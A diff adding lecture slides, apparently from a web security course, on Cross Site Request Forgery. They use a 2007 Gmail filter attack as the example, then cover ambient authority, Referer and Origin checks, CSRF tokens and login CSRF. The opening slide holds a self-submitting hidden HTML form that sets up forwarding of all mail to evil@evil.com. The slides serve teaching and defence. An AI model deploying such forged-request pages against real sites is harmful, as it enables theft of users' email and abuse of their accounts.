@@ -1,0 +1,94 @@
+
+### submitting forms  {.smaller}
+
+
+```html
+<form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf"
+    enctype="multipart/form-data"> 
+    <input type="hidden" name="cf2_emc" value="true"/> 
+    <input type="hidden" name="cf2_email" value="evil@evil.com"/> 
+    ...
+    <input type="hidden" name="s" value="z"/> 
+    <input type="hidden" name="irf" value="on"/> 
+    <input type="hidden" name="nvp_bu_cftb" value="Create Filter"/> 
+</form> 
+<script>
+document.forms[0].submit();
+</script>
+
+```
+ 
+
+* above form: 2007 GMail email filter form 
+
+   * pre filled out: match all messages; forward to <code>evil@evil.com</code>
+
+* form will be submitted with <em>the user's cookies!</em>
+
+
+### Cross Site Request Forgery (CSRF)  {.smaller}
+
+
+* take advantage of ‘‘<em>ambient authority</em>’’ of user 
+
+   * e.g. user is allowed request to make an email filter
+
+* any webpage can make requests to other websites 
+
+   * looks the same as requests made legitmately?
+   * [can't read result, but does that matter?]{.fragment fragment-index=2 .custom .myem-only}
+
+* problem: cookie in request $\not=$ user authorized request
+* problem: want to treat user as logged in when linked from another site 
+
+   * can't just have browser omit cookies
+
+
+
+### defending against CSRF (1)  {.smaller}
+
+
+* one idea: check the Referer [sic] header 
+
+   * actually works here --- browser is not going to betray its user
+
+* problem: not always sent 
+<hr class="vspace" />
+* real solution: add a <em>secret token</em> (<em>CSRF token</em>) to the form
+* must <em>not be guessable</em>  
+
+   * example: copy of secret cookie value
+
+
+
+### defending against CSRF (2)  {.smaller}
+
+
+* browsers sometimes send <code>Origin</code> or <code>Referer</code> header 
+
+   * if present, contain information about source of request
+
+* some types of requests require same origin 
+
+   * XMLHttpRequest JavaScript API
+   * can send headers normal requests can't
+
+
+
+### CSRF versus changing form parameters 
+
+
+
+## Login CSRF {visibility="hidden"}
+
+### subtle CSRF attack: login  {.smaller}
+
+
+* vulnerable CSRF targets aren't just actions like ‘‘email filter’’
+* can also <em>log user into attacker's account</em> 
+
+   * then, e.g., they enter payment information
+
+* attacker could read info from account?
+* often websites forgot to protect login form
+
